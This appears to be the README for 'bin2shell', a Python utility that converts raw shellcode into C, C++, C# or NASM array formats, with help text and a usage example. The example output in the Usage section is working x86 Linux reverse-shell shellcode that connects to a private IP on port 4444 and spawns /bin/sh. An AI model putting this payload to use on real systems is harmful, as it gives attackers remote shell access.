# 🐚 bin2shell

## 📜 Description
A small script that generate shellcode from various low level languages. 

📚 Table of Contents
- 📜 [Description](#-description)
- ⚙️ [Help](#-help)
- 📌 [Author](#-author)
- 👨🏾‍⚖️ [License](#-license)

## ⚙️ Help
```bash
python3 bin2shell.py -h

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
      Author: @l0n3m4n / Shellcode Generator / v1.2

usage: bin2shell.py [-h] -s shellcode.bin [-c c.txt] [-cpp cpp.txt] [-cs cs.txt] [-asm asm.txt]

Shellcode Generator (C,C#,CPP,ASM)

options:
  -h, --help            show this help message and exit
  -s shellcode.bin, --shellcode shellcode.bin
                        Input shellcode binary file
  -c c.txt, --c_output c.txt
                        Output file for C formatted shellcode
  -cpp cpp.txt, --cpp_output cpp.txt
                        Output file for C++ formatted shellcode
  -cs cs.txt, --cs_output cs.txt
                        Output file for C# formatted shellcode
  -asm asm.txt, --asm_output asm.txt
                        Output file for Assembly (NASM) formatted shellcode

Example usage: python3 bin2shell.py -s shellcode.bin -c shellcode_c.txt
```
## Usage
```bash
$ python3 bin2shell.py -s shellcode.bin -c shellcode_c.txt

  ,--.   ,--.         ,---.        ,--.            ,--.,--. 
  |  |-. `--',--,--, '.-.  \ ,---. |  ,---.  ,---. |  ||  | 
  | .-. ',--.|      \ .-' .'(  .-' |  .-.  || .-. :|  ||  | 
  | `-' ||  ||  ||  |/   '-..-'  `)|  | |  |\   --.|  ||  | 
   `---' `--'`--''--''-----'`----' `--' `--' `----'`--'`--' 
      Author: @l0n3m4n / Shellcode Generator / v1.2


Formatted C Shellcode:

"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" 
"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x0a\x5e\x68" 
"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1" 
"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3" 
"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

Saved C formatted shellcode to shellcode_c.txt
```
## 📌 Author
- [Facebook](https://facebook.com/l0n3m4n)
- [Twitter (X)](https://twitter.com/l0n3m4n)
- [Medium](https://medium.com/l0n3m4n)
- [Website](https://l0n3m4n.github.io)

## 👨🏾‍⚖️ License
This project is under terms of the [MIT License](LICENSE). For fixing Bugs, create [issue](https://github.com/l0n3m4n/bin2shell/issues/new)
